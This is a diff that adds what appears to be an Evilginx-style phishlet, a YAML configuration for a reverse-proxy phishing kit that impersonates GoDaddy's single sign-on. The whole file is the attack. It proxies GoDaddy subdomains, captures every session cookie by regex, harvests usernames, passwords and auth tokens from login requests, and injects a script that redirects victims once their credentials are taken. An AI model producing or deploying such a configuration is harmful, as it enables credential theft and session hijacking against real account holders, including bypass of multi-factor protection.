@@ -1,0 +1,85 @@
+name: "GoDaddy"
+author: ""
+min_ver: "2.3.0"
+proxy_hosts:
+  - { phish_sub: "sso", orig_sub: "sso", domain: "godaddy.com", session: true, is_landing: true }
+  - { phish_sub: "gui", orig_sub: "gui", domain: "godaddy.com", session: true, is_landing: false }
+  - { phish_sub: "account", orig_sub: "account", domain: "godaddy.com", session: true, is_landing: false }
+  - { phish_sub: "api", orig_sub: "api", domain: "godaddy.com", session: true, is_landing: false }
+  - { phish_sub: "www", orig_sub: "www", domain: "godaddy.com", session: false, is_landing: false }
+
+sub_filters:
+  # SSO hostname replacement
+  - { triggers_on: "sso.godaddy.com", orig_sub: "sso", domain: "godaddy.com", search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ["text/html", "text/javascript", "application/json", "application/javascript", "application/x-javascript"] }
+  - { triggers_on: "sso.godaddy.com", orig_sub: "sso", domain: "godaddy.com", search: '{hostname}', replace: '{hostname}', mimes: ["text/html", "text/javascript", "application/json", "application/javascript", "application/x-javascript"] }
+  - { triggers_on: "sso.godaddy.com", orig_sub: "sso", domain: "godaddy.com", search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ["text/html", "application/json", "application/javascript"] }
+  - { triggers_on: "sso.godaddy.com", orig_sub: "sso", domain: "godaddy.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"], redirect_only: true }
+
+  # GUI hostname replacement
+  - { triggers_on: "gui.godaddy.com", orig_sub: "gui", domain: "godaddy.com", search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ["text/html", "text/javascript", "application/json", "application/javascript", "application/x-javascript"] }
+  - { triggers_on: "gui.godaddy.com", orig_sub: "gui", domain: "godaddy.com", search: '{hostname}', replace: '{hostname}', mimes: ["text/html", "text/javascript", "application/json", "application/javascript", "application/x-javascript"] }
+  - { triggers_on: "gui.godaddy.com", orig_sub: "gui", domain: "godaddy.com", search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ["text/html", "application/json", "application/javascript"] }
+  - { triggers_on: "gui.godaddy.com", orig_sub: "gui", domain: "godaddy.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"], redirect_only: true }
+
+  # Account hostname replacement
+  - { triggers_on: "account.godaddy.com", orig_sub: "account", domain: "godaddy.com", search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ["text/html", "text/javascript", "application/json", "application/javascript", "application/x-javascript"] }
+  - { triggers_on: "account.godaddy.com", orig_sub: "account", domain: "godaddy.com", search: '{hostname}', replace: '{hostname}', mimes: ["text/html", "text/javascript", "application/json", "application/javascript", "application/x-javascript"] }
+
+  # API hostname replacement
+  - { triggers_on: "api.godaddy.com", orig_sub: "api", domain: "godaddy.com", search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ["text/html", "text/javascript", "application/json", "application/javascript", "application/x-javascript"] }
+  - { triggers_on: "api.godaddy.com", orig_sub: "api", domain: "godaddy.com", search: '{hostname}', replace: '{hostname}', mimes: ["text/html", "text/javascript", "application/json", "application/javascript", "application/x-javascript"] }
+
+  # www hostname replacement
+  - { triggers_on: "www.godaddy.com", orig_sub: "www", domain: "godaddy.com", search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ["text/html", "text/javascript", "application/json", "application/javascript", "application/x-javascript"] }
+  - { triggers_on: "www.godaddy.com", orig_sub: "www", domain: "godaddy.com", search: '{hostname}', replace: '{hostname}', mimes: ["text/html", "text/javascript", "application/json", "application/javascript", "application/x-javascript"] }
+
+auth_tokens:
+  # Capture all cookies set on the godaddy.com domain
+  # GoDaddy uses dynamically-named session cookies, so regex capture all
+  - domain: '.godaddy.com'
+    keys: ['.*,regexp']
+  - domain: 'sso.godaddy.com'
+    keys: ['.*,regexp']
+  - domain: 'gui.godaddy.com'
+    keys: ['.*,regexp']
+  - domain: 'account.godaddy.com'
+    keys: ['.*,regexp']
+  - domain: 'api.godaddy.com'
+    keys: ['.*,regexp']
+
+auth_urls:
+  - "/products"
+  - "/vh-login-redirect"
+  - "/dashboard"
+  - "/my-products*"
+
+credentials:
+  username:
+    key: "username"
+    search: "(.*)"
+    type: "post"
+  password:
+    key: "password"
+    search: "(.*)"
+    type: "post"
+  custom:
+    - key: "auth_token"
+      search: '"auth_token":"([^"]*)"'
+      type: "json"
+
+login:
+  domain: "sso.godaddy.com"
+  path: "/"
+
+js_inject:
+  - trigger_domains: ["sso.godaddy.com"]
+    trigger_paths: ["/"]
+    script: |
+      function gimmesleep(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+      }
+      async function redir() {
+        await gimmesleep(2000);
+        window.location.href = "{rurl}";
+      }
+      redir()
